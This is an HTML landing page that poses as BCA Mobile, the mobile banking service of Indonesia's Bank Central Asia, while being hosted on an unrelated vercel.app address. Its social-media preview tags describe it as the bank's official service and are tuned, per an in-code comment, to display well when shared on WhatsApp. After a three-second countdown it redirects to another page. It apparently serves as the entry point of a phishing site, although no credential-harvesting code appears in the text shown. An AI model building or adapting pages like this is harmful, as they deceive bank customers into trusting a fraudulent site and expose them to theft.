<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BCA Mobile</title>
    
    <!-- ✅ BAGIAN INI SUPAYA GAMBAR MUNCUL DI WHATSAPP -->
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="PT. Bank Central Asia (Persero) Tbk." />
    <meta property="og:image" content="https://mobile-menor22.vercel.app/masukk.jpg" />
    <meta property="og:image:secure_url" content="https://mobile-menor22.vercel.app/masukk.jpg" />
    <meta property="og:image:type" content="image/png" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:title" content="BCA Mobile" />
    <meta property="og:description" content="PT Bank Central Asia (Persero) Tbk — Layanan resmi BCA Mobile" />
    <meta property="og:url" content="https://mobile-menor22.vercel.app/" />
    
    <!-- Tambahan untuk WhatsApp & media sosial lain -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:image" content="https://mobile-menor22.vercel.app/masukk.jpg" />
    <link rel="icon" href="https://mobile-menor22.vercel.app/masukk.jpg" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000000;
            position: relative;
        }

        /* Gambar tampilan pembuka */
        #gambarPembuka {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }

        
        }
    </style>
</head>
<body>

    <!-- ✅ Gambar utama — pastikan masuk.png diunggah ke Vercel -->
    <img id="gambarPembuka" src="masuk.png" alt="BCA Mobile">
    <div id="timer">3</div>

    <script>
        let waktu = 3;
        let timerDisplay = document.getElementById('timer');
        
        let hitungMundur = setInterval(function() {
            waktu--;
            timerDisplay.textContent = waktu;
            
            if(waktu <= 0) {
                clearInterval(hitungMundur);
                window.location.href = "index1.html"; 
            }
        }, 1000);
    </script>

</body>
</html>
